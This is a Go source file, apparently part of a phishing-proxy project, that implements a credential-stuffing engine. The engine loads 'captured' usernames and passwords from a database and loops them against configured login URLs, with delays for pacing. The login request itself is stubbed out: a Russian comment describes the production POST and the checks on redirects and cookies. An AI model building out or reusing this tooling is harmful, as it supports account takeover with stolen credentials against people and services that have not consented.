package credentialstuffing

import (
	"context"
	"sync"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// TargetService represents a service to test credentials against
type TargetService struct {
	ID       string
	Name     string
	LoginURL string
	Enabled  bool
}

// StuffingResult result of credential check
type StuffingResult struct {
	CredentialID string
	ServiceID    string
	Success      bool
	StatusCode   int
	Error        string
	CheckedAt    time.Time
}

// Config credential stuffing configuration
type Config struct {
	Enabled        bool
	TargetServices []TargetService
	RateLimit      int           // requests per minute
	DelayBetween   time.Duration // delay between attempts
}

// Engine runs credential stuffing checks
type Engine struct {
	config *Config
	db     *database.Database
	mu     sync.Mutex
}

// NewEngine creates credential stuffing engine
func NewEngine(cfg *Config, db *database.Database) *Engine {
	return &Engine{config: cfg, db: db}
}

// CheckCredential tests credential against a service (conceptual - actual implementation uses HTTP client)
func (e *Engine) CheckCredential(ctx context.Context, cred *database.Credentials, service TargetService) (*StuffingResult, error) {
	if !e.config.Enabled {
		return nil, nil
	}
	e.mu.Lock()
	// Rate limiting
	time.Sleep(e.config.DelayBetween)
	e.mu.Unlock()

	// В production: выполнить HTTP POST на LoginURL с cred.Username, cred.Password
	// Проверить редирект, cookies, response body
	_ = cred
	_ = service
	return &StuffingResult{
		CredentialID: cred.ID,
		ServiceID:    service.ID,
		Success:      false,
		CheckedAt:    time.Now(),
	}, nil
}

// CheckAllCredentials runs stuffing for all captured creds against configured services
func (e *Engine) CheckAllCredentials(ctx context.Context) ([]StuffingResult, error) {
	if !e.config.Enabled {
		return nil, nil
	}
	creds, err := e.db.ListCredentials(1000, 0)
	if err != nil {
		return nil, err
	}
	var results []StuffingResult
	for _, cred := range creds {
		for _, svc := range e.config.TargetServices {
			if !svc.Enabled {
				continue
			}
			res, err := e.CheckCredential(ctx, cred, svc)
			if err != nil {
				continue
			}
			if res != nil {
				results = append(results, *res)
			}
		}
	}
	return results, nil
}
